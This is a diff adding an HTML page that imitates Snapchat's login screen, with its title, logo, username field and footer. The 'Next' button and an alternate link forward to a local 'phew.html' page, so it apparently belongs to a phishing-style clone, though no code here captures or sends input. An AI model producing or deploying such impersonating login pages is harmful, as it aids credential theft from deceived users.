@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | Snapchat</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="img/snapfavicon.png" type="image/png">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="img/snapchat-app-icon.svg" alt="Snapchat Logo" class="logo">
+            <h2>Log in to Snapchat</h2>
+            <form>
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" placeholder="Username or Email" required>
+                <p class="alt-login"><a href="../phew.html">Use phone number instead</a></p>
+            </form>
+            <button type="submit" class="next-button" onclick="window.location.href='../phew.html'">Next</button>
+            <p class="signup-text">New To Snapchat? <a href="#">Sign Up</a></p>
+        </div>
+
+        <div class="footer">
+            <ul>
+                <li><a href="#">Company</a></li>
+                <li><a href="#">Community</a></li>
+                <li><a href="#">Advertising</a></li>
+                <li><a href="#">Legal</a></li>
+            </ul>
+            <div class="language">
+                <label for="language-select">Language</label>
+                <select id="language-select">
+                    <option>English (US)</option>
+                    <option>English (UK)</option>
+                    <option>Spanish</option>
+                    <option>French</option>
+                    <option>German</option>
+                    <option>Arabic</option>
+                    <option>Russian</option>
+                    <option>Portuguese</option>
+                    <!-- Add other languages as options here -->
+                </select>
+            </div>
+            <div class="privacy-terms">
+                <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
